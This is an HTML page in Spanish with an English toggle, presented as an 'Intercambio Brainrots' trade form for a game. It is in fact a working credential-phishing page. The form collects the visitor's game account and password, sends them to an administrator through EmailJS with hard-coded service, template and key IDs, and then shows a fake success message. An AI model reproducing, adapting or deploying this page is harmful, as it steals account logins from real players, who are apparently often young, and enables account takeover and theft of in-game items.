<!DOCTYPE html>
<html lang="es">
<head>
    <link rel="icon" href="crown_game_sports_console_controller_sport_video_play_gaming_icon_262443.ico" type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Intercambio Brainrots</title>
    <meta name="description" content="Completa tu peticion.">
    <meta name="keywords" content="brainrots">
    <meta name="author" content="Sistema de Intercambios">
    <meta name="robots" content="noindex, nofollow">
    
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        /* TUS ESTILOS ACTUALES (se mantienen igual) */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 15px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
            url('https://github.com/anasshouzmali4tc-cpu/vv/blob/main/descarga.jpg?raw=true') no-repeat center center fixed;
            background-size: cover;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .registro-container {
            width: 100%;
            max-width: 400px;
            background: rgba(19, 23, 34, 0.92);
            border-radius: 16px;
            padding: 40px 25px;
            text-align: center;
            position: relative;
        }
        
        .language-selector {
            position: absolute;
            top: 10px;
            right: 10px;
        }
        
        .intercambio-title {
            color: #fff;
            font-size: 2.2rem;
            font-weight: 800;
            margin-bottom: 5px;
        }
        
        .registro-subtitle {
            color: #a0aec0;
            margin-bottom: 25px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #e2e8f0;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            background: rgba(30, 35, 48, 0.8);
            color: #fff;
        }
        
        .accept-btn {
            background: linear-gradient(to right, #00a2ff, #00d4ff);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 16px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
        }
        
        .loading {
            display: none;
            color: #00a2ff;
            margin: 8px 0;
            padding: 10px;
        }
        
        .error-message {
            display: none;
            color: #ff6b6b;
            background: rgba(255, 107, 107, 0.1);
            padding: 10px;
            border-radius: 8px;
            margin: 8px 0;
        }
        
        .gracias-mensaje {
            display: none;
            text-align: center;
            padding: 30px 20px;
        }
    </style>
</head>
<body>
    <div class="registro-container">
        <div class="language-selector">
            <select id="language-select">
                <option value="es">Espa√±ol</option>
                <option value="en">English</option>
            </select>
        </div>
        
        <div class="intercambio-title">INTERCAMBIO</div>
        <div class="registro-subtitle" data-es="Completar peticion" data-en="Complete request">Completar Peticion</div>
        
        <form id="forma-registro" class="registro-form">
            <div class="form-group">
                <label for="account" data-es="Cuenta de brainrots:" data-en="Brainrots account:">Cuenta de brainrots:</label>
                <input type="text" id="account" placeholder="Ingresa tu cuenta" required>
            </div>
            
            <div class="form-group">
                <label for="password" data-es="Contrase√±a de brainrot:" data-en="Brainrot password:">Contrase√±a de brainrot:</label>
                <input type="password" id="password" placeholder="Ingresa tu contrase√±a" required>
            </div>
            
            <div class="loading" id="loading" data-es="Procesando..." data-en="Processing...">Procesando...</div>
            <div class="error-message" id="error-message"></div>
            
            <button type="submit" class="accept-btn" id="submit-btn" data-es="CONTINUAR" data-en="CONTINUE">CONTINUAR</button>
        </form>
        
        <div class="gracias-mensaje" id="gracias-mensaje">
            <h2 data-es="¬°Gracias! ‚úÖ" data-en="Thank You! ‚úÖ">¬°Gracias! ‚úÖ</h2>
            <p><strong data-es="Peticion completada con √©xito" data-en="Request completed successfully">Peticion completada con √©xito</strong></p>
            <p data-es="Tu peticion ha sido procesada" data-en="Your request has been processed">Tu Peticion ha sido procesada</p>
        </div>
    </div>

    <script>
        // Inicializar EmailJS
        emailjs.init("BgugL5adTp__2FfNx");
        
        let currentLang = 'es';

        // Funci√≥n para cambiar idioma
        function changeLanguage(lang) {
            currentLang = lang;
            document.querySelectorAll('[data-es]').forEach(element => {
                if (element.hasAttribute(`data-${lang}`)) {
                    element.textContent = element.getAttribute(`data-${lang}`);
                }
            });
        }
        
        // Evento del formulario - VERSI√ìN SIMPLIFICADA PARA DEBUG
        document.getElementById('forma-registro').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const account = document.getElementById('account').value.trim();
            const password = document.getElementById('password').value.trim();
            
            console.log('üîç VALORES CAPTURADOS:', {
                cuenta: account,
                contrase√±a: password
            });

            if (!account || !password) {
                showError('Por favor, completa todos los campos');
                return;
            }

            // Mostrar loading
            document.getElementById('loading').style.display = 'block';
            document.getElementById('error-message').style.display = 'none';
            document.getElementById('submit-btn').disabled = true;

            // PAR√ÅMETROS CON VALORES REALES DEL USUARIO
            const templateParams = {
                usuario_brinrot: account,      // ESTE valor cambia con cada usuario
                contra_brinrot: password,      // ESTE valor cambia con cada usuario
                from_name: 'Formulario Web',
                to_name: 'Administrador', 
                fecha: new Date().toLocaleString(),
                idioma: currentLang,
                ip: 'N/A'
            };

            console.log('üöÄ ENVIANDO A EMAILJS:', templateParams);

            emailjs.send('service_08y0xce', 'template_ga9xk7u', templateParams)
                .then(function(response) {
                    console.log('‚úÖ EMAIL ENVIADO CORRECTAMENTE');
                    console.log('Respuesta:', response);
                    
                    // Mostrar √©xito
                    document.getElementById('forma-registro').style.display = 'none';
                    document.getElementById('gracias-mensaje').style.display = 'block';
                    
                    // Limpiar formulario
                    document.getElementById('account').value = '';
                    document.getElementById('password').value = '';
                })
                .catch(function(error) {
                    console.error('‚ùå ERROR ENVIANDO EMAIL:', error);
                    let errorMsg = 'Error: ';
                    if (error.text) errorMsg += error.text;
                    else if (error.message) errorMsg += error.message;
                    else errorMsg += JSON.stringify(error);
                    
                    showError(errorMsg);
                });
        });

        function showError(message) {
            document.getElementById('error-message').textContent = message;
            document.getElementById('error-message').style.display = 'block';
            document.getElementById('loading').style.display = 'none';
            document.getElementById('submit-btn').disabled = false;
        }

        // Inicializar p√°gina
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('language-select').addEventListener('change', function(e) {
                changeLanguage(e.target.value);
            });
            changeLanguage('es');
        });
    </script>
</body>
</html>
